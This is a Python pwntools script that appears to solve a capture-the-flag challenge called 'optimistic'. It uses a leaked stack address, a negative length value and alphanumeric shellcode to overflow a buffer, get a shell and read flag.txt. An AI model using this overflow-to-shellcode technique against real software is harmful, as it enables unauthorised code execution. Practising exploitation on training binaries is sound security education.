#!/usr/bin/env python3


from pwn import *
import sys

context.arch = "amd64"

def exploit(io):
    io.sendlineafter(b":", b"y")
    io.recvuntil(b"gift: ")
    rbp_leak = int(io.recvline().strip().decode(), 16)
    print("rbp_leak: ", hex(rbp_leak))
    buffer = rbp_leak - 96
    print("buffer: ", hex(buffer))
    
    io.sendlineafter(b"Email: ", b"A")
    io.sendlineafter(b"Age: ", b"A")
    io.sendlineafter(b"name: ", b"-1")

    shellcode = b"XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V"
   
    payload = shellcode.ljust(104, b"A") + p64(buffer)
    io.sendlineafter(b"Name: ", payload) 
    io.recv()
    sleep(0.2)

    io.sendline(b"cat flag.txt")
    flag = io.recv().decode()
    print(flag)






def main():
    if sys.argv[1] == "debug":
        io = gdb.debug("./optimistic")
    else:
        HOST, PORT = sys.argv[1].split(":")
        io = remote(HOST, PORT)
    exploit(io)



if __name__ == "__main__":
    main()
